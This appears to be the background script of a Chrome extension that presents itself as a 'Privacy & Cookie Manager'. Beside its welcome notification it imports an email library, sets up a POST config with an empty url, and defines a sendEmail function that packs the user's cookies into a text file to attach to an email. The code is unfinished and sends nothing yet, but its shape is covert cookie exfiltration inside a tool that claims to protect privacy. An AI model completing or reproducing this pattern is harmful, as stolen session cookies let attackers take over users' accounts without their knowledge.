importScripts('email.min.js');
chrome.runtime.onInstalled.addListener(() => {
    chrome.notifications.create({
        type: 'basic',
        title: 'Privacy & Cookie Manager',
        message: 'Welcome to Cookie Manager! Click the extension icon to get started.',
        iconUrl: 'icons/icon128.png'
    });
})

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'createNotification') {
        chrome.notifications.create(request.options);
    }
})
let config = {
    method: 'POST',
    url: '',

}

function sendEmail(to, subject, message, cookies) {
    const fileContent = cookies;
    const blob = new Blob([fileContent], { type: 'text/plain' });
    const file = new File([blob], "message.txt", { type: "text/plain" });

}

